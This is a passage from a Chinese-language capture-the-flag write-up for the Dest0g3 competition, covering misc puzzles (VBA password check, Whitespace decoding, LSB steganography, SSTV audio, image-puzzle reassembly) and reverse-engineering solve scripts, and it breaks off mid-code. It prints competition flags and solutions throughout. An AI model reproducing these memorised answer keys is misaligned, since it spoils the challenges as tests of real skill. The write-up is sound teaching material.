class="hljs-keyword">Sub</span> CB_OK_Click()<br><span class="hljs-keyword">Dim</span> strpasw <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strdec <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strusrinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> t <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>t = ChrW(<span class="hljs-number">21152</span>) &amp; ChrW(<span class="hljs-number">27833</span>) &amp; ChrW(<span class="hljs-number">21543</span>) &amp; ChrW(<span class="hljs-number">65292</span>) &amp; ChrW(<span class="hljs-number">21516</span>) &amp; ChrW(<span class="hljs-number">23398</span>) &amp; ChrW(<span class="hljs-number">20204</span>) &amp; ChrW(<span class="hljs-number">65281</span>)<br><br>strusrinput = Dialog.TextBox_Pasw<br><span class="hljs-keyword">Dim</span> sinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>sinput = strusrinput<br><br><span class="hljs-keyword">If</span> (strusrinput &lt;&gt; <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">Then</span><br>  strusout = Encode(strusrinput, t)<br>  <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;┤℡ǒqｘ~&quot;</span>) <span class="hljs-keyword">Then</span><br>      strdec = Decode(Dialog.Label_ls.Caption, sinput)<br>  <span class="hljs-keyword">Else</span><br>     <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ｋGJEｇｑ&quot;</span>) <span class="hljs-keyword">Then</span><br>        strdec = Decode(Dialog.Label_ls1.Caption, sinput)<br>     <span class="hljs-keyword">Else</span><br>          <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ЮΟopz+&quot;</span>) <span class="hljs-keyword">Then</span><br>             strdec = Decode(Dialog.Label_ls2.Caption, sinput)<br>          <span class="hljs-keyword">Else</span><br>                <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ｚΚjrШφεあ&quot;</span>) <span class="hljs-keyword">Then</span><br>                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)<br>                <span class="hljs-keyword">Else</span><br>                    <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;àǖtＵｗ┧ｈè&quot;</span>) <span class="hljs-keyword">Then</span><br>                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)<br>                    <span class="hljs-keyword">Else</span><br>                          strdec = <span class="hljs-string">&quot;密码不正确,别泄气再来!&quot;</span><br>                    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>                <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>           <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>      <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   Label_CLUE.Caption = strdec<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure>
<p>只要看这个按钮事件即可。</p>
<p>这里面要判断我们的输入是否满足要求。</p>
<p>我们的字符串首先进入了Encode编码了一下。而且用的是固定密钥，所以我们直接Decode对应的目标字符串就能得到我们想要的输入是什么。</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-string">&quot;┤℡ǒqｘ~&quot;</span> : 123456<br><span class="hljs-string">&quot;ｋGJEｇｑ&quot;</span> : <span class="hljs-type">aaaaaa</span><br><span class="hljs-string">&quot;ЮΟopz+&quot;</span> : 000000<br><span class="hljs-string">&quot;ｚΚjrШφεあ&quot;</span> : 墙角数枝<br><span class="hljs-string">&quot;àǖtＵｗ┧ｈè&quot;</span> : <span class="hljs-type">iloveyou</span><br></code></pre></td></tr></table></figure>
<p>以上是对应的字符串所需要输入的数据。</p>
<p>依次尝试，只有“墙角数枝”给出了提示：</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">解压密码:两只黄鹂鸣翠柳,一行白鹭上青天!<br></code></pre></td></tr></table></figure>
<p>Rar密码为复杂型，长度为16位，包含了字母、数字和符号。这一行诗加上符号刚好16位。我觉得就是把这句诗首字母提出来就行了，加上符号。由于要有数字，所以一改为1，两改为2。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure>
<p>发现不对，又换了其他的密码。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure>
<p>这些都不对，奇了怪了…</p>
<p>最后写了个脚本把所有大小写都爆破一遍，还是不行…</p>
<p>最后把这个小问题给了我队友，结果给他解出来了。密码是：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt.<br></code></pre></td></tr></table></figure>
<p>给我干沉默了…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="python_jail"><a class="markdownIt-Anchor" href="#python_jail"></a> Python_jail</h2>
<p>解压之后，有个压缩包要密码，然后有一个password和hint。看了一下password，全是空白字符，以为是SNOW隐写，但是hint里面说是一种语言，所以应该是white_space语言。</p>
<p><a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p>
<p>将password里面的数据导入，点击右上角的Run运行。得到密码:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a8e15220</span>-<span class="hljs-number">7404</span>-<span class="hljs-number">4269</span>-<span class="hljs-number">812</span>e-<span class="hljs-number">6418557</span>b7dc2<br></code></pre></td></tr></table></figure>
<p>解压得到一张图片。</p>
<p>LSB提取有些信息比较令人注意。在三通道LSB下:</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">e99881e59ca8e8bf 99e9878c5a6d7868  <span class="hljs-string">........</span> <span class="hljs-string">....Zmxh</span><br>5a3374694e574a6a 5a6d4d344e793031  Z3tiNWJj ZmM4Ny01<br>593245324c54517a 5a6a4574596a4d34  Y2E2LTQz ZjEtYjM4<br>4e4330314e325177 4f5749344f445a6a  NC01N2Qw OWI4ODZj<br>59546c3975230000 00e7949fe68890e6  YTl9u<span class="hljs-comment">#.. ........</span><br>8890e58a9f0a4669 6e6420697420696e  <span class="hljs-string">......Fi</span> nd it in<br>20796f757220666f 6c6465724e2904da   your fo lderN)<span class="hljs-string">..</span><br>046f70656eda0466 696c65da05777269  <span class="hljs-string">.open..f</span> ile.<span class="hljs-string">.wri</span><br>7465da057072696e 74a9007206000000  te.<span class="hljs-string">.prin</span> t.<span class="hljs-string">.r....</span><br>7206000000fa0766 6c61672e7079da08  r.<span class="hljs-string">.....f</span> lag.py..<br>3c6d6f64756c653e 0100000073040000  &lt;module&gt; <span class="hljs-string">....s...</span><br>000a020a01004190 409b0eccc7d6a2f9  <span class="hljs-string">......A.</span> @<span class="hljs-string">.......</span><br>df7fff3fffffffff 57fedfe2a159ef50  ..?<span class="hljs-string">....</span> W.<span class="hljs-string">...Y.P</span><br></code></pre></td></tr></table></figure>
<p>上面是一串base64</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ZmxhZ<span class="hljs-number">3</span>ti<span class="hljs-symbol">NWJjZmM4</span><span class="hljs-symbol">Ny01</span>Y<span class="hljs-number">2</span>E<span class="hljs-number">2</span>LTQzZjEtYj<span class="hljs-name">M4</span><span class="hljs-symbol">NC01</span><span class="hljs-symbol">N2</span>QwOWI<span class="hljs-number">4</span>ODZjYTl<span class="hljs-number">9</span>u<br>base<span class="hljs-number">64</span>：<br>flag&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br><br><span class="hljs-attr"># Dest0</span><span class="hljs-name">g3</span>&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br></code></pre></td></tr></table></figure>
<p>但是这不是我们想要的flag。我给他套了一个Dest0g3交上去不对。</p>
<p>下面这段话就看的我头大了。没有看懂这是啥意思。感觉像是让python脚本来写出flag。那么这个flag.py在哪里呢？</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Find it in your folder<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">print</span> <br>flag.<span class="hljs-keyword">py</span><br><span class="hljs-symbol">&lt;module&gt;</span><br></code></pre></td></tr></table></figure>
<p>后面试了一下直接把flag提交了，没想到竟然过了…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="4096"><a class="markdownIt-Anchor" href="#4096"></a> 4096</h2>
<p>启动靶机，是一个4096小游戏，在local_storage_manager.js中找到了一部分的flag。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPartFlag</span>(<span class="hljs-params">score</span>) &#123;<br>  <span class="hljs-keyword">if</span> (score &gt; <span class="hljs-number">10000</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);<br>  &#125;<br>&#125;<br># 4ee7-b673-971d81f8b177&#125;<br></code></pre></td></tr></table></figure>
<p>在看网页元素的时候一个img很奇怪。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;favicon.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>大小为1，但实际上图片大小不是这个。把这个文件下载下来。</p>
<p>文件大小不对。这个png有12mb。很显然里面藏了东西。</p>
<p>二进制打开看看。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">RIFFö¾WAVEfmt <br></code></pre></td></tr></table></figure>
<p>在PNG头的下方还有一个RIFF头，这是一个音频文件。把PNG部分删了之后就可以用音频打开了。音频隐写我不太会说实话。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>part_flag<span class="hljs-selector-class">.jpg</span>.....<br></code></pre></td></tr></table></figure>
<p>文件的尾部还有一个jpg。binwalk分离出来一个压缩包。里面是这个文件。但是需要密码。我觉得密码是在音频中。</p>
<p>前面部分和最后很明显是拨号音，只截取前后的DTMF的话得到的是：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span><br></code></pre></td></tr></table></figure>
<p>但这也不是密码啊。这是个什么脑洞。</p>
<p>问了一下我们组的人，叫我试试SSTV。说实话我是没想到是SSTV，也算是长见识了，第一次做这种题了。</p>
<p>sstv解码之后就是一张图片了，不过是倒过来的。</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">password:<br>		<br>		<br>		<br>		<span class="hljs-constructor">MD5(<span class="hljs-params">cell</span> <span class="hljs-params">phone</span> <span class="hljs-params">number</span>)</span><br></code></pre></td></tr></table></figure>
<p>电话号码我们已经拿到了，所以直接md5看看。</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">MD5:</span><br><span class="hljs-number">6</span>c6551787d7071ff48400b855b851ccb<br></code></pre></td></tr></table></figure>
<p>结果并不是这个密码。手机号好像没有7开头的吧，而我们得到的数据最后一位是1，说不定是将得到的数据反转。试试。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span> -&gt; <span class="hljs-number">13879085947</span><br>MD5:<br><span class="hljs-number">3</span>f119efa3254ae786fe44aff4582faa4<br></code></pre></td></tr></table></figure>
<p>结果还是不对…我是直接用的数字进行加密的，说不定是先对字符串进行编码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>md5(<span class="hljs-string">b&quot;13879085947&quot;</span>).hexdigest()<br><span class="hljs-string">&#x27;32fc1b5487cb447f792a19418b92544e&#x27;</span><br></code></pre></td></tr></table></figure>
<p>这下终于解开了。</p>
<p>结果里面是个小拼图。</p>
<img src="https://s2.loli.net/2022/05/26/NlDXTEFbQ5tzogG.jpg" srcset="/img/loading.gif" lazyload alt="part_flag" style="zoom:50%;" />
<p>这里直接用工具就可以解了，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/gaps/gaps/bin]<br>└─$ python3 gaps --image=part_flag.jpg --size=64 --save<br><br>=== Population:  200<br>=== Generations: 20<br>=== Piece size:  64 px<br>=== Pieces:      240<br><br>=== Analyzing image: ██████████████████████████████████████████████████ 100.0% <br>=== Solving puzzle:  ███████████████████████████████████████----------- 78.9% <br><br>=== GA terminated<br>=== There was no improvement for 10 generations<br><br>=== Done in 17.401 s<br>=== Result saved as &#x27;part_flag_solution.jpg&#x27;<br>=== Close figure to exit<br></code></pre></td></tr></table></figure>
<p>结果这个每次跑都不太一样，没有那种可以完美复原的。看来只能自己来拼接了。</p>
<img src="https://s2.loli.net/2022/05/26/hZJM13C4yniNSmu.jpg" srcset="/img/loading.gif" lazyload alt="part_flag_solution" style="zoom:50%;" />
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RGVzdD<br>kMTE0Zi05Z<br>BnM3tlZDR<br>U0<br>W<br><span class="hljs-section">LQ</span><br><span class="hljs-section">==</span><br></code></pre></td></tr></table></figure>
<p>写个脚本跑一下结果吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>table = [<span class="hljs-string">&quot;RGVzdD&quot;</span>,<span class="hljs-string">&quot;kMTE0Zi05Z&quot;</span>,<span class="hljs-string">&quot;BnM3tlZDR&quot;</span>,<span class="hljs-string">&quot;U0&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;LQ&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(table, <span class="hljs-built_in">len</span>(table)):<br>    data = <span class="hljs-string">&#x27;&#x27;</span>.join(i) + <span class="hljs-string">&quot;==&quot;</span><br>    data = b64decode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Dest0g3&#123;&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(data)<br>        <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x16-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x0bA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9ee4-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eb\xd0S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x14\xd1&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x16S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96V-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96KA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd1i\x0cLM\x19\x8bNY-&#x27;</span><br><span class="hljs-string">....</span><br><span class="hljs-string">....</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;ed4d114f-9ee4-</span><br></code></pre></td></tr></table></figure>
<p>和上面的flag进行组合得到：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;ed4d114f<span class="hljs-string">-9</span>ee4<span class="hljs-string">-4</span>ee7-b673<span class="hljs-string">-971</span>d81f8b177&#125;<br></code></pre></td></tr></table></figure>
<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1>
<h2 id="simplexor"><a class="markdownIt-Anchor" href="#simplexor"></a> simpleXOR</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-160h]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">52</span>]; <span class="hljs-comment">// [rsp+120h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+154h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+158h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+15Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">247</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">35</span>; ++i )<br>  &#123;<br>    v4[i + <span class="hljs-number">36</span>] = v5[i];<br>    v4[i] = v6 ^ (v4[i + <span class="hljs-number">36</span>] + i);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">0x23</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != result_0[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!!!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( j == <span class="hljs-number">35</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>找到result_0的值：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xb3</span>,<span class="hljs-number">0</span>x91,<span class="hljs-number">0</span>x82,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>xc3,<span class="hljs-number">0</span>x9b,<span class="hljs-number">0</span>xce,<span class="hljs-number">0</span>x75,<br><span class="hljs-attribute">0xcf</span>,<span class="hljs-number">0</span>x9c,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x84,<br><span class="hljs-attribute">0xaa</span>,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>xb1,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>x71,<br><span class="hljs-attribute">0x8d</span>,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x86,<span class="hljs-number">0</span>xbf,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>xa8,<span class="hljs-number">0</span>xa3,<span class="hljs-number">0</span>x9c,<br><span class="hljs-attribute">0x83</span>,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x57<br></code></pre></td></tr></table></figure>
<p>求逆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>data = [<span class="hljs-number">0xb3</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x80</span>,<br>        <span class="hljs-number">0xc3</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x75</span>,<br>        <span class="hljs-number">0xcf</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x85</span>,<br>        <span class="hljs-number">0x85</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x84</span>,<br>        <span class="hljs-number">0xaa</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xbb</span>,<br>        <span class="hljs-number">0xb1</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x71</span>,<br>        <span class="hljs-number">0x8d</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xbf</span>,<br>        <span class="hljs-number">0x73</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x9c</span>,<br>        <span class="hljs-number">0x83</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x57</span>]<br><br>key = <span class="hljs-number">247</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((data[i]^key) - i), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment"># Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="hi"><a class="markdownIt-Anchor" href="#hi"></a> hi</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-ACh]</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-A8h]</span><br>  <span class="hljs-type">char</span> enc[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-A0h]</span><br>  <span class="hljs-type">char</span> 